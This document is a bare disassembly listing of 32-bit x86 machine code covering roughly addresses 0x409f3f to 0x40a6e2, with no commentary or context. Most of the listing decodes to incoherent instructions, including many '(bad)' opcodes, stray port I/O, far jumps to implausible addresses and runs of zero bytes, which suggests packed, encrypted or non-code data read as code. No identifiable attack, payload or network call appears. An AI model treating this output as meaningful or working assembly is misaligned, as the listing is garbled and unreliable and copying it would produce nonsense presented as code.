  409f3f:	mov    esp,0x44809e7c
  409f44:	jmp    0x409f3d
  409f46:	(bad)  
  409f48:	push   esp
  409f49:	dec    ebx
  409f4a:	push   ebp
  409f4b:	dec    esi
  409f4c:	jbe    0x409fb7
  409f4e:	jns    0x409f88
  409f50:	jl     0x409f8b
  409f52:	adc    dl,bl
  409f54:	add    edi,eax
  409f56:	dec    ebp
  409f57:	or     eax,0x2b8a8d24
  409f5c:	lock jnp 0x409fd9
  409f5f:	lods   al,BYTE PTR ds:[esi]
  409f60:	daa    
  409f61:	add    DWORD PTR [ebp+0x7f7d7628],0xc84df020
  409f6b:	call   0x86be1473
  409f70:	sbb    eax,DWORD PTR [esi-0x51846a39]
  409f76:	es add ch,bl
  409f79:	inc    ebp
  409f7a:	pop    ss
  409f7b:	adc    al,0xda
  409f7d:	mov    dh,0x2
  409f7f:	setg   BYTE PTR [edx+edi*8+0x3a545547]
  409f87:	jne    0x409fcf
  409f89:	test   ch,0x17
  409f8c:	bound  eax,QWORD PTR [eax]
  409f8e:	add    BYTE PTR [eax],al
  409f90:	add    BYTE PTR [eax],al
  409f92:	jae    0x409fbb
  409f94:	inc    esp
  409f95:	or     eax,0xbe646f81
  409f9a:	mov    esi,?
  409f9c:	mov    ch,BYTE PTR [ecx+ebp*2]
  409f9f:	pop    edx
  409fa0:	leave  
  409fa1:	jmp    0xa728a21c
  409fa6:	loopne 0x409faa
  409fa8:	add    BYTE PTR [ebp-0x4f],ah
  409fab:	outs   dx,DWORD PTR ds:[esi]
  409fac:	push   eax
  409fad:	shl    BYTE PTR [eax-0x5],1
  409fb0:	xchg   esp,eax
  409fb1:	test   eax,0xd9243f59
  409fb6:	scas   eax,DWORD PTR es:[edi]
  409fb7:	pop    ss
  409fb8:	and    DWORD PTR [edi-0x4dfa8737],0x3a
  409fbf:	es sbb dl,bh
  409fc2:	mov    ebx,gs
  409fc4:	jae    0x409fd3
  409fc6:	jne    0x409fa2
  409fc8:	mov    DWORD PTR [eax+esi*2+0x2],ebx
  409fcc:	test   BYTE PTR [ecx],ch
  409fce:	sbb    eax,0x9ad4ff1d
  409fd3:	js     0x40a019
  409fd5:	fldcw  WORD PTR [esi]
  409fd7:	mov    eax,0xda76e8ff
  409fdc:	(bad)  
  409fdd:	xor    BYTE PTR [eax+0x2],bh
  409fe0:	test   BYTE PTR [ecx],ch
  409fe2:	std    
  409fe3:	or     al,ch
  409fe5:	shl    DWORD PTR [eax-0x14],1
  409fe8:	(bad)  
  409fe9:	xchg   ebx,eax
  409fea:	xchg   BYTE PTR [ebp+0x43],bh
  409fed:	int    0x72
  409fef:	push   edx
  409ff0:	push   esi
  409ff1:	push   cs
  409ff2:	jl     0x40a022
  409ff4:	push   ss
  409ff5:	add    BYTE PTR [eax],al
  409ff7:	add    BYTE PTR [eax],al
  409ff9:	add    BYTE PTR [eax],al
  409ffb:	sbb    al,0xff
  409ffd:	xor    bl,bl
  409fff:	fistp  QWORD PTR [edx-0x241cbcf6]
  40a005:	adc    ebx,DWORD PTR [eax]
  40a007:	pop    ds
  40a008:	aas    
  40a009:	add    BYTE PTR [edx+0x1c],ch
  40a00c:	(bad)  
  40a00d:	lahf   
  40a00e:	adc    DWORD PTR [edi+edi*8],ebx
  40a011:	and    BYTE PTR [eax+esi*2+0xa],0x0
  40a016:	add    DWORD PTR [edi+0x6],0x75
  40a01a:	adc    eax,0x208729c
  40a01f:	inc    ecx
  40a020:	(bad)  
  40a021:	(bad)  
  40a022:	je     0x40a094
  40a024:	push   ss
  40a025:	push   DWORD PTR [eax+esi*2+0x16]
  40a029:	call   0x467b59
  40a02e:	jmp    0x40a015
  40a030:	xor    DWORD PTR [edx+0x24],0xfddcc6e4
  40a037:	jmp    0x40a014
  40a039:	mov    DWORD PTR [eax+eax*8-0x16],esi
  40a03d:	std    
  40a03e:	ss in  al,0x49
  40a041:	or     BYTE PTR [eax],al
  40a043:	int3   
  40a044:	push   esp
  40a045:	call   0x3f7499
  40a04a:	mov    eax,ss
  40a04c:	and    dl,BYTE PTR [eax+ebp*8]
  40a04f:	test   dh,bl
  40a051:	(bad)  
  40a052:	call   DWORD PTR [edi]
  40a054:	rcr    BYTE PTR [ebp+0x5e],0xe7
  40a058:	addr16 in al,0x5d
  40a05b:	pop    esi
  40a05c:	jmp    0x40a05c
  40a05e:	push   ebp
  40a05f:	add    BYTE PTR [eax],al
  40a061:	add    BYTE PTR [eax],al
  40a063:	add    bl,ah
  40a065:	test   DWORD PTR [di-0x193d],0xdc49ade6
  40a06e:	std    
  40a06f:	lea    edx,[ebx]
  40a071:	(bad)  
  40a072:	out    0xa5,eax
  40a074:	mov    eax,ebx
  40a076:	std    
  40a077:	lea    esi,[ebp-0x68]
  40a07a:	sbb    dl,BYTE PTR [eax+0x5a]
  40a07d:	out    dx,eax
  40a07e:	adc    dl,BYTE PTR [ebx]
  40a080:	mov    ch,0xdb
  40a082:	jns    0x40a102
  40a084:	jno    0x40a0e4
  40a086:	out    dx,al
  40a087:	jae    0x40a103
  40a089:	mov    ch,ch
  40a08b:	adc    al,0x69
  40a08d:	int3   
  40a08e:	inc    edx
  40a08f:	add    dl,dl
  40a091:	inc    ecx
  40a092:	ror    DWORD PTR [esi],0xe3
  40a095:	repz cmp DWORD PTR [ebp+ebp*2+0x22],esi
  40a09a:	ja     0x40a0a8
  40a09c:	call   0x772bacc6
  40a0a1:	outs   dx,BYTE PTR ds:[esi]
  40a0a2:	cmp    cl,BYTE PTR [eax]
  40a0a4:	lock mov dl,0x76
  40a0a7:	add    al,0x47
  40a0a9:	fadd   DWORD PTR [esi+ebp*8+0xa]
  40a0ae:	or     BYTE PTR [esi-0x2],dl
  40a0b1:	pop    es
  40a0b2:	sub    BYTE PTR [eax],cl
  40a0b4:	cld    
  40a0b5:	icebp  
  40a0b6:	sti    
  40a0b7:	mov    dh,0x65
  40a0b9:	fdiv   st(3),st
  40a0bb:	mov    dh,0x35
  40a0bd:	fidiv  DWORD PTR [edi+0x50]
  40a0c0:	xor    eax,0x8df0c59b
  40a0c6:	ja     0x40a0eb
  40a0c8:	add    BYTE PTR [eax],al
  40a0ca:	add    BYTE PTR [eax],al
  40a0cc:	add    dh,ch
  40a0ce:	and    bh,ah
  40a0d0:	cmp    dh,BYTE PTR [eax+esi*8+0x24bd2b0e]
  40a0d7:	mov    esi,0x564a370e
  40a0dc:	add    eax,ebp
  40a0de:	lods   eax,DWORD PTR ds:[esi]
  40a0df:	jmp    0x40a154
  40a0e1:	push   ecx
  40a0e2:	out    dx,eax
  40a0e3:	jns    0x40a11b
  40a0e5:	xchg   edx,eax
  40a0e6:	(bad)  
  40a0e7:	cs push ss
  40a0e9:	xor    eax,0x71c37fdb
  40a0ee:	inc    esp
  40a0ef:	add    DWORD PTR [ebx+0xb2db52],eax
  40a0f5:	rol    DWORD PTR [edx],cl
  40a0f7:	sub    edi,esp
  40a0f9:	push   0x4e
  40a0fb:	jb     0x40a0dd
  40a0fd:	lds    edx,FWORD PTR [ebx-0x1a]
  40a100:	mov    ch,0xad
  40a102:	add    eax,0x50dadb6a
  40a107:	jge    0x40a11c
  40a109:	mov    esp,0x8704753b
  40a10e:	ret    0xa4ff
  40a111:	cmp    ch,cl
  40a113:	call   0xd24b4396
  40a118:	add    al,bh
  40a11a:	jno    0x40a10d
  40a11c:	js     0x40a198
  40a11e:	test   DWORD PTR [ebx-0x14],ecx
  40a121:	sbb    dl,BYTE PTR [esi+esi*1+0x79]
  40a125:	int    0x75
  40a127:	out    0x3,eax
  40a129:	jne    0x40a1a2
  40a12b:	and    BYTE PTR [esi+eiz*4],bl
  40a12e:	jmp    0x40b90e
  40a133:	add    BYTE PTR [eax],al
  40a135:	add    BYTE PTR [esi+0x42],ah
  40a138:	jmp    0x6c36d9b5
  40a13d:	ret    
  40a13e:	data16 adc al,0x9e
  40a141:	jne    0x40a1b0
  40a143:	push   edx
  40a144:	cmp    DWORD PTR [ebx+esi*2+0x397ae902],0x7d4571ea
  40a14f:	jnp    0x40a174
  40a151:	lock daa 
  40a153:	jmp    0x42a6ad33
  40a158:	jmp    0xe92ad2dd
  40a15d:	js     0x40a198
  40a15f:	cli    
  40a160:	mov    ch,0x7e
  40a162:	dec    ecx
  40a163:	out    0xdb,al
  40a165:	push   ss
  40a166:	neg    BYTE PTR [esi+0x4d]
  40a169:	add    ebx,DWORD PTR ds:0x7503bc32
  40a16f:	pop    esp
  40a170:	in     eax,0x4b
  40a172:	lea    ebx,[ebx]
  40a174:	add    BYTE PTR [edi],cl
  40a176:	jno    0x40a17a
  40a178:	xor    ch,BYTE PTR [ecx]
  40a17a:	dec    ebp
  40a17b:	inc    ebp
  40a17c:	mov    esi,0x2e3d9
  40a181:	mov    bh,0xbc
  40a183:	(bad)  
  40a184:	push   edi
  40a185:	fld    TBYTE PTR ds:0x76c715e0
  40a18b:	add    al,BYTE PTR [ecx+ebp*1-0x5b74e23e]
  40a192:	push   edx
  40a193:	jge    0x40a1e9
  40a195:	icebp  
  40a196:	ret    0x836
  40a199:	xchg   esi,eax
  40a19a:	add    BYTE PTR [eax],al
  40a19c:	add    BYTE PTR [eax],al
  40a19e:	add    al,cl
  40a1a0:	fiadd  DWORD PTR [ecx]
  40a1a2:	(bad)  
  40a1a4:	add    al,BYTE PTR [ecx+ebp*4+0x248b11a5]
  40a1ab:	sbb    DWORD PTR [ecx+0x6a],edx
  40a1ae:	in     eax,0xbe
  40a1b0:	jne    0x40a206
  40a1b2:	icebp  
  40a1b3:	or     DWORD PTR cs:0xd77c76e9,esp
  40a1ba:	mov    dh,0x84
  40a1bc:	jmp    0x7300:0x277bfe7
  40a1c3:	mov    dl,0x48
  40a1c5:	pop    ebx
  40a1c6:	aas    
  40a1c7:	and    dl,al
  40a1c9:	add    ebp,ecx
  40a1cb:	inc    ecx
  40a1cc:	push   ecx
  40a1cd:	push   ebp
  40a1ce:	bound  ebp,QWORD PTR ds:0x261f181e
  40a1d4:	jnp    0x40a1cd
  40a1d6:	ins    BYTE PTR es:[edi],dx
  40a1d7:	inc    esi
  40a1d8:	sbb    dl,BYTE PTR [esi+0x60]
  40a1db:	inc    ebp
  40a1dc:	push   ds
  40a1dd:	adc    BYTE PTR [esi-0x7c],ch
  40a1e0:	push   cs
  40a1e1:	adc    ebp,DWORD PTR [ecx-0x1abb848a]
  40a1e7:	push   ebx
  40a1e8:	aas    
  40a1e9:	or     bh,bl
  40a1eb:	dec    eax
  40a1ec:	rol    BYTE PTR [ebx+0x5],0x59
  40a1f0:	add    DWORD PTR [ebp-0x76183500],ecx
  40a1f6:	push   es
  40a1f7:	fbld   TBYTE PTR [esi+0x73]
  40a1fa:	and    al,0x98
  40a1fc:	cmp    BYTE PTR [esi+0x451074],0x50
  40a203:	add    BYTE PTR [eax],al
  40a205:	add    BYTE PTR [eax],al
  40a207:	add    BYTE PTR [ebx+0xc132011],dl
  40a20d:	add    edi,DWORD PTR ds:0x34d02
  40a213:	jne    0x40a242
  40a215:	sub    eax,0x7c8ffdb
  40a21a:	adc    bh,bh
  40a21c:	sub    ebx,edi
  40a21e:	adc    al,BYTE PTR [eax+0x4c]
  40a221:	gs ret 0x35b
  40a225:	cmp    DWORD PTR [ebp+0x59],ebx
  40a228:	mov    ch,0xc0
  40a22a:	push   cs
  40a22b:	add    BYTE PTR [edi+0x4b3b0042],ah
  40a231:	div    BYTE PTR [ebp+0x7]
  40a234:	fisub  DWORD PTR [esi]
  40a236:	and    al,0x20
  40a238:	push   ds
  40a239:	enter  0x56ba,0xc3
  40a23d:	adc    DWORD PTR [eax],ebx
  40a23f:	adc    ecx,DWORD PTR [esi+edi*8+0x31]
  40a243:	shl    BYTE PTR [edi+0x1336fdb8],0x12
  40a24a:	or     al,0x13
  40a24c:	mov    esi,?
  40a24e:	and    BYTE PTR [esi],0xcc
  40a251:	dec    edx
  40a252:	rol    BYTE PTR [eax],0xdc
  40a255:	add    ch,al
  40a257:	cmp    ebx,edx
  40a259:	add    al,BYTE PTR [eax]
  40a25b:	mov    edi,DWORD PTR [edx+eax*4]
  40a25e:	hlt    
  40a25f:	je     0x40a2d9
  40a261:	push   0x42ca3c1c
  40a266:	add    BYTE PTR [edx+0x54],ch
  40a269:	(bad)  [edx+0x24]
  40a26c:	add    BYTE PTR [eax],al
  40a26e:	add    BYTE PTR [eax],al
  40a270:	add    BYTE PTR [esp+edx*2-0x1],ch
  40a274:	shl    DWORD PTR [ebp+0x63],cl
  40a277:	aas    
  40a278:	and    al,0x45
  40a27a:	rol    DWORD PTR [edx+0x7bd88aff],0x7d
  40a281:	inc    ecx
  40a282:	push   esi
  40a283:	imul   eax,DWORD PTR [eax+0xf],0xbb8851d9
  40a28a:	repz jmp 0x432657a4
  40a290:	add    dh,ch
  40a292:	xchg   edi,eax
  40a293:	push   ds
  40a294:	cmp    dh,dh
  40a296:	pop    ss
  40a297:	or     eax,DWORD PTR [ebp+0x6650903c]
  40a29d:	idiv   BYTE PTR [esi-0x6]
  40a2a0:	dec    eax
  40a2a2:	xchg   esp,eax
  40a2a3:	stc    
  40a2a4:	mov    ch,0xb0
  40a2a6:	loop   0x40a308
  40a2a8:	mov    ecx,eax
  40a2aa:	jecxz  0x40a30c
  40a2ac:	rcl    DWORD PTR [edi],0xf4
  40a2af:	pusha  
  40a2b0:	or     esi,DWORD PTR [edi]
  40a2b2:	aad    0xaf
  40a2b4:	out    0x6a,eax
  40a2b6:	test   BYTE PTR [edx],al
  40a2b8:	call   0x449ede
  40a2bd:	std    
  40a2be:	pop    ss
  40a2bf:	and    BYTE PTR [esi+ebp*8],ah
  40a2c2:	call   0x5002:0xdb5407db
  40a2c9:	inc    esp
  40a2ca:	or     al,0xe9
  40a2cc:	sar    BYTE PTR [edx+0x45],cl
  40a2cf:	inc    eax
  40a2d0:	and    al,0xa5
  40a2d2:	pop    eax
  40a2d3:	ror    BYTE PTR [ebx],0x0
  40a2d6:	add    BYTE PTR [eax],al
  40a2d8:	add    BYTE PTR [eax],al
  40a2da:	sub    eax,0x49481207
  40a2df:	call   0xdbb6233e
  40a2e4:	add    ch,BYTE PTR [edx+0x75]
  40a2e7:	or     al,0xe9
  40a2e9:	adc    al,0x35
  40a2eb:	lds    eax,FWORD PTR [edx+0x0]
  40a2ee:	neg    BYTE PTR [edi+0x271eaf7]
  40a2f4:	iret   
  40a2f5:	jp     0x40a307
  40a2f7:	inc    eax
  40a2f8:	jb     0x40a362
  40a2fa:	push   ecx
  40a2fb:	sbb    ah,BYTE PTR [edx-0x3f]
  40a2fe:	call   0xa479:0x7503e96f
  40a305:	pop    ds
  40a306:	imul   edx,DWORD PTR [ecx-0x69],0xa892be5b
  40a30d:	add    ebx,ebp
  40a30f:	add    ch,cl
  40a311:	sti    
  40a312:	push   0xffffffdd
  40a314:	inc    esp
  40a315:	add    al,0x75
  40a317:	add    ah,BYTE PTR [ebp-0x3c]
  40a31a:	out    0xfd,al
  40a31c:	pop    ecx
  40a31d:	add    ebx,DWORD PTR [edx+eax*1+0xe]
  40a321:	jmp    0x8b51ef71
  40a326:	jns    0x40a32a
  40a328:	jmp    0x433ab1
  40a32d:	hlt    
  40a32e:	xor    ch,ah
  40a330:	in     eax,dx
  40a331:	jbe    0x40a2e3
  40a333:	idiv   BYTE PTR [eax]
  40a335:	jmp    0x443aa9c3
  40a33a:	jne    0x40a36d
  40a33c:	test   eax,0x7a
  40a341:	add    BYTE PTR [eax],al
  40a343:	js     0x40a3c0
  40a345:	es add ah,bh
  40a348:	cmp    esi,ecx
  40a34a:	jl     0x40a384
  40a34c:	rcl    DWORD PTR [esi],0x51
  40a34f:	out    dx,al
  40a350:	icebp  
  40a351:	stc    
  40a352:	call   0x1377c804
  40a357:	(bad)  
  40a358:	cmp    ebp,ebp
  40a35a:	call   0xede4e05
  40a35f:	imul   edx,DWORD PTR [ecx],0x293a0429
  40a365:	iret   
  40a366:	jne    0x40a342
  40a368:	in     al,0xfe
  40a36a:	(bad)  
  40a36b:	fimul  DWORD PTR [esp+eiz*8+0x3]
  40a36f:	jne    0x40a2f2
  40a371:	jmp    FWORD PTR [esi-0x2b00b156]
  40a377:	xchg   BYTE PTR [ecx],dl
  40a379:	inc    eax
  40a37a:	jmp    0xb903e7ac
  40a37f:	inc    ecx
  40a380:	dec    esp
  40a381:	mov    ebx,DWORD PTR [ecx+0xb]
  40a384:	aas    
  40a385:	or     al,0xb9
  40a387:	cmovno esp,DWORD PTR [esi*8-0x25ebf273]
  40a38f:	add    dh,BYTE PTR ss:[ebx]
  40a392:	adc    bl,BYTE PTR [edi-0x454bf7bc]
  40a398:	dec    ebp
  40a399:	xor    edx,DWORD PTR [edi+ecx*4]
  40a39c:	add    al,0x76
  40a39e:	fadd   st(5),st
  40a3a0:	ja     0x40a3e7
  40a3a2:	in     eax,dx
  40a3a3:	shl    esi,1
  40a3a5:	or     ch,0x0
  40a3a8:	add    BYTE PTR [eax],al
  40a3aa:	add    BYTE PTR [eax],al
  40a3ac:	push   ds
  40a3ad:	in     al,0x72
  40a3af:	shl    BYTE PTR [eax+0xeb5ff02],cl
  40a3b5:	in     eax,0x14
  40a3b7:	leave  
  40a3b8:	mov    DWORD PTR [edx+0x0],eax
  40a3bb:	fs ss jns 0x40a404
  40a3bf:	in     eax,dx
  40a3c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3c1:	adc    bh,bh
  40a3c3:	adc    eax,0xe514e4c9
  40a3c8:	addr16 inc edx
  40a3ca:	add    BYTE PTR [edx+0x4b],ah
  40a3cd:	inc    BYTE PTR [edx-0x161c2ef3]
  40a3d3:	out    0x7f,al
  40a3d5:	div    DWORD PTR [edi+0x428bed60]
  40a3db:	and    al,0x9e
  40a3dd:	adc    al,0x72
  40a3df:	lods   al,BYTE PTR ds:[esi]
  40a3e0:	cmp    bh,BYTE PTR [ecx+0x1d]
  40a3e3:	jb     0x40a403
  40a3e5:	ret    
  40a3e6:	loopne 0x40a3d3
  40a3e8:	idiv   DWORD PTR [ebp-0x1817efd]
  40a3ee:	(bad)  
  40a3ef:	dec    esp
  40a3f1:	cmp    bh,bh
  40a3f3:	je     0x40a3a5
  40a3f5:	out    0xfd,eax
  40a3f7:	adc    eax,0x4010c4
  40a3fc:	jp     0x40a435
  40a3fe:	pop    ecx
  40a3ff:	ret    
  40a400:	loope  0x40a46a
  40a402:	jmp    0x40a455
  40a404:	fst    QWORD PTR [eax-0x73]
  40a407:	inc    edi
  40a408:	cwde   
  40a409:	xor    eax,0xd7d18950
  40a40e:	std    
  40a40f:	adc    eax,0x0
  40a414:	add    BYTE PTR [eax+0x7f004010],ah
  40a41a:	mov    eax,0xec545f37
  40a41f:	or     DWORD PTR [esi+0x38ffff5c],0x39
  40a426:	jmp    0x40a435
  40a428:	test   cl,dl
  40a42a:	(bad)  
  40a42b:	(bad)  
  40a42c:	call   edi
  40a42e:	jmp    0x40a3bb
  40a430:	ja     0x40a482
  40a432:	push   0xb
  40a434:	lea    edx,[eax-0x1]
  40a437:	(bad)  
  40a438:	inc    ebp
  40a43a:	jno    0x40a438
  40a43c:	call   0x40a3cd
  40a441:	nop
  40a442:	mov    esi,0x485f6d72
  40a447:	add    al,0xff
  40a449:	ror    DWORD PTR [esi],0xff
  40a44c:	jne    0x40a466
  40a44e:	fdiv   QWORD PTR [ebx+0x8]
  40a451:	dec    edi
  40a452:	fist   DWORD PTR [ebx]
  40a454:	lock push ds
  40a456:	aas    
  40a457:	add    BYTE PTR [ebx+0x74f317bc],cl
  40a45d:	in     al,dx
  40a45e:	adc    eax,0x18a0145d
  40a463:	push   0x2
  40a465:	lahf   
  40a466:	dec    edi
  40a467:	push   DWORD PTR [ebp-0x20]
  40a46a:	dec    eax
  40a46b:	call   DWORD PTR [esi+0x75]
  40a46e:	jmp    esi
  40a470:	(bad)  
  40a471:	pusha  
  40a472:	xchg   ecx,eax
  40a473:	adc    BYTE PTR [eax+0x75],al
  40a476:	push   esi
  40a477:	ret    
  40a478:	je     0x40a47a
  40a47a:	add    BYTE PTR [eax],al
  40a47c:	add    BYTE PTR [eax],al
  40a47e:	xchg   ecx,eax
  40a47f:	adc    BYTE PTR fs:[eax],al
  40a482:	xchg   BYTE PTR [ecx],bl
  40a484:	add    al,0x50
  40a486:	inc    ebx
  40a487:	push   esp
  40a488:	adc    BYTE PTR [esi+eax*4],al
  40a48b:	cdq    
  40a48c:	add    dl,BYTE PTR [esi-0x66]
  40a48f:	in     eax,dx
  40a490:	not    BYTE PTR [edx]
  40a492:	xor    eax,0xfe0e79d9
  40a497:	int    0xe6
  40a499:	rcl    BYTE PTR [esi+edx*8-0x26898a26],0x2
  40a4a1:	jmp    0x40a42b
  40a4a3:	dec    BYTE PTR fs:[edx+0x87a2fb8]
  40a4aa:	in     al,dx
  40a4ab:	mov    edi,0x9972fe83
  40a4b0:	in     eax,0x14
  40a4b2:	dec    ecx
  40a4b3:	fiadd  WORD PTR [edx+0x0]
  40a4b6:	push   es
  40a4b7:	jmp    0x40a49e
  40a4b9:	je     0x40a4f8
  40a4bb:	or     DWORD PTR [eax],edx
  40a4bd:	sbb    BYTE PTR [esi-0x55],ah
  40a4c0:	add    bl,BYTE PTR [esi-0x1]
  40a4c3:	sub    al,0x4a
  40a4c5:	leave  
  40a4c6:	aaa    
  40a4c7:	mov    esp,0x54c65102
  40a4cc:	pop    es
  40a4cd:	adc    al,0x86
  40a4cf:	sub    eax,DWORD PTR [edx*2+0xc6666aa]
  40a4d6:	mov    ds:0xbbfed0d0,al
  40a4db:	ror    DWORD PTR [ebx-0x1],cl
  40a4de:	pusha  
  40a4df:	jecxz  0x40a4f0
  40a4e1:	inc    eax
  40a4e2:	add    BYTE PTR [eax],al
  40a4e4:	add    BYTE PTR [eax],al
  40a4e6:	add    BYTE PTR [ebp-0x24],dh
  40a4e9:	aad    0xc5
  40a4eb:	xor    DWORD PTR [edi],eax
  40a4ed:	cmc    
  40a4ee:	add    BYTE PTR [edx+eax*1-0x725a9229],bl
  40a4f5:	out    0x18,al
  40a4f7:	mov    eax,0x47449085
  40a4fc:	add    eax,0x8d1d4403
  40a501:	add    BYTE PTR ss:[edi-0x1f],cl
  40a505:	adc    al,BYTE PTR [ebx]
  40a507:	add    BYTE PTR [edi],cl
  40a509:	inc    eax
  40a50a:	push   ebx
  40a50b:	inc    ebp
  40a50c:	loope  0x40a4e1
  40a50e:	out    0x84,eax
  40a510:	inc    edx
  40a511:	jmp    0xf0987f94
  40a516:	cmp    BYTE PTR [ecx+0x7161242],0xb9
  40a51d:	inc    ecx
  40a51e:	(bad)  
  40a51f:	mov    eax,0x7af50d46
  40a524:	cmp    BYTE PTR [esi],bh
  40a526:	shl    DWORD PTR [ebx+0x50],1
  40a529:	loope  0x40a577
  40a52b:	push   0xfffffff7
  40a52d:	rcl    BYTE PTR [eax],1
  40a52f:	mov    ch,0x2
  40a531:	jae    0x40a573
  40a533:	xchg   ecx,eax
  40a534:	adc    DWORD PTR [esi+0x2a3bae46],edi
  40a53a:	dec    edi
  40a53b:	(bad)  
  40a53c:	in     eax,dx
  40a53d:	fsubr  DWORD PTR [bp+si-0x16fd]
  40a542:	add    esp,DWORD PTR [esi+0x6d4e2215]
  40a548:	aas    
  40a549:	(bad)  [edi+0x0]
  40a54c:	add    BYTE PTR [eax],al
  40a54e:	add    BYTE PTR [eax],al
  40a550:	jg     0x40a533
  40a552:	jae    0x40a567
  40a554:	or     eax,0x7503f66e
  40a559:	in     eax,dx
  40a55a:	out    dx,eax
  40a55b:	push   ebx
  40a55c:	adc    dl,BYTE PTR [edi-0x7]
  40a55f:	fcmovne st,st(3)
  40a561:	pop    ecx
  40a562:	call   0x212936a
  40a567:	icebp  
  40a568:	xchg   BYTE PTR [esi],bh
  40a56a:	jb     0x40a5aa
  40a56c:	cmp    DWORD PTR [ecx],0xa9136400
  40a572:	std    
  40a573:	scas   al,BYTE PTR es:[edi]
  40a574:	fld1   
  40a576:	inc    ebp
  40a577:	mov    dh,BYTE PTR [edi+0x2]
  40a57a:	push   0xffffffe4
  40a57c:	dec    ebx
  40a57d:	pop    esi
  40a57e:	lock xor DWORD PTR [ecx+0x76e8e31b],ebp
  40a585:	cmp    BYTE PTR [ebp-0x1212194],cl
  40a58b:	jle    0x40a5d3
  40a58d:	(bad)  
  40a58e:	(bad)  
  40a58f:	sbb    DWORD PTR [edx],esp
  40a591:	inc    esi
  40a592:	adc    al,0x19
  40a594:	shl    DWORD PTR [ebx-0x7a8916ea],0xc3
  40a59b:	stc    
  40a59c:	cmp    DWORD PTR [ebp+0x11a56f7],eax
  40a5a2:	call   esp
  40a5a4:	jb     0x40a533
  40a5a6:	inc    esp
  40a5a7:	icebp  
  40a5a8:	and    eax,0x59f16fe1
  40a5ad:	imul   DWORD PTR [ebx-0x7cfd4924]
  40a5b3:	xor    DWORD PTR [eax],eax
  40a5b5:	add    BYTE PTR [eax],al
  40a5b7:	add    BYTE PTR [eax],al
  40a5b9:	ja     0x40a610
  40a5bb:	add    dh,BYTE PTR [ebx+0x2e]
  40a5be:	loope  0x40a634
  40a5c0:	cmc    
  40a5c1:	cs and al,0x3
  40a5c4:	jmp    0xf028de3f
  40a5c9:	jne    0x40a5cd
  40a5cb:	add    BYTE PTR [edi+0x305ac4bc],ah
  40a5d1:	xor    al,0x10
  40a5d3:	add    BYTE PTR [ebp+ebp*4+0x6bfd82eb],bl
  40a5da:	fadd   DWORD PTR [ecx+esi*8+0x26]
  40a5de:	xor    eax,0xf222fc8b
  40a5e3:	aas    
  40a5e4:	jmp    0x6aaffc38
  40a5e9:	xchg   edi,eax
  40a5ea:	push   cs
  40a5eb:	xor    al,BYTE PTR [eax]
  40a5ed:	cmp    ch,BYTE PTR [ebp-0xa]
  40a5f0:	push   es
  40a5f1:	fnsave [edi]
  40a5f3:	fs push 0xffffffde
  40a5f6:	jb     0x40a673
  40a5f8:	rol    BYTE PTR [esi+ebp*8+0x3cde2c5],0xff
  40a600:	jbe    0x40a5e2
  40a602:	nop
  40a603:	(bad)  
  40a606:	push   cs
  40a607:	push   eax
  40a608:	(bad)  
  40a609:	call   DWORD PTR [esi]
  40a60b:	push   0x8
  40a60d:	xchg   esp,eax
  40a60e:	(bad)  
  40a60f:	int    0xe8
  40a611:	fimul  DWORD PTR [esi+edi*8+0x72c618ff]
  40a618:	aas    
  40a619:	jbe    0x40a622
  40a61b:	lea    edi,[ebp+0x0]
  40a61e:	add    BYTE PTR [eax],al
  40a620:	add    BYTE PTR [eax],al
  40a622:	cmp    BYTE PTR [esi],bl
  40a624:	call   0x45e4cb
  40a629:	(bad)  
  40a62a:	(bad)  [ebx]
  40a62c:	push   eax
  40a62d:	jmp    FWORD PTR [edx-0x407a17d9]
  40a633:	push   es
  40a634:	add    BYTE PTR [ebp-0x7c9cc564],al
  40a63a:	and    DWORD PTR [ebx],ecx
  40a63c:	add    BYTE PTR [esi-0xf],dh
  40a63f:	ins    BYTE PTR es:[edi],dx
  40a640:	add    DWORD PTR [eax-0x19],edx
  40a643:	dec    ecx
  40a644:	or     BYTE PTR [edx+0x5f],ch
  40a647:	sbb    eax,ebp
  40a649:	(bad)  
  40a64a:	(bad)  {k3}{z}
  40a64f:	xlat   BYTE PTR ds:[ebx]
  40a650:	add    eax,0xffffffb8
  40a653:	dec    ebx
  40a654:	push   0x0
  40a656:	xor    edi,DWORD PTR [ecx]
  40a658:	adc    BYTE PTR [edx+0x18],ch
  40a65b:	lock aaa 
  40a65d:	adc    BYTE PTR [edx+0x5574fedb],0xbc
  40a664:	add    al,0x1
  40a666:	test   al,0xfa
  40a668:	mov    WORD PTR [ebp+0x75],?
  40a66b:	jge    0x40a682
  40a66d:	ror    BYTE PTR ds:0x7500e612,0xc8
  40a674:	pop    eax
  40a675:	or     al,0xfe
  40a677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a678:	loope  0x40a6ef
  40a67a:	jge    0x40a675
  40a67c:	loop   0x40a650
  40a67e:	inc    ebp
  40a67f:	inc    ebx
  40a680:	or     al,0x58
  40a682:	out    dx,al
  40a683:	xchg   edi,eax
  40a684:	jmp    0x0:0x57
  40a68b:	sti    
  40a68c:	call   0xfcf62a93
  40a691:	repz mov bh,BYTE PTR [ebx]
  40a694:	mov    ebp,0xdeba006c
  40a699:	or     ch,BYTE PTR [edx+0x74]
  40a69c:	imul   ebx
  40a69e:	scas   al,BYTE PTR es:[edi]
  40a69f:	stos   DWORD PTR es:[edi],eax
  40a6a0:	push   edi
  40a6a1:	loop   0x40a701
  40a6a3:	mov    ds:0x9e7503c4,al
  40a6a9:	(bad)  
  40a6aa:	jmp    0x40a6a0
  40a6ac:	dec    esp
  40a6ad:	inc    DWORD PTR [ebx]
  40a6af:	jne    0x40a69a
  40a6b1:	xor    eax,0x3a144756
  40a6b6:	jmp    DWORD PTR [eax+0x25]
  40a6b9:	cmc    
  40a6ba:	aas    
  40a6bb:	jne    0x40a725
  40a6bd:	(bad)  
  40a6bf:	loope  0x40a658
  40a6c1:	stos   BYTE PTR es:[edi],al
  40a6c2:	psubsw mm4,mm2
  40a6c5:	(bad)  
  40a6c6:	into   
  40a6c7:	dec    ebp
  40a6c8:	cmp    DWORD PTR [edi],esi
  40a6ca:	add    DWORD PTR [ebp-0x10],esi
  40a6cd:	or     BYTE PTR [edi+0x5d],dl
  40a6d0:	pusha  
  40a6d1:	push   edx
  40a6d2:	add    dh,BYTE PTR [ebp+0x67]
  40a6d5:	ret    
  40a6d6:	je     0x40a6a8
  40a6d8:	jae    0x40a6e0
  40a6da:	add    DWORD PTR [ebp-0x15],esi
  40a6dd:	(bad)  
  40a6de:	(bad)  
  40a6df:	clc    
  40a6e0:	out    dx,ax
  40a6e2:	cld    
